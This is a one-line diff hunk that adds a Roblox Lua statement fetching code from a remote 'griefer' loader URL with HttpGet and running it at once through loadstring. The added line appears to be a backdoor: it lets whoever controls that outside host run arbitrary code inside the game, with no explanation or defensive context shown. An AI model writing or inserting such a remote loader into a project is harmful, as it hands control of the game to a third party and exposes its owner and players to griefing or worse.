@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://secret.griefer.world/loader?pid=de14d558"))()
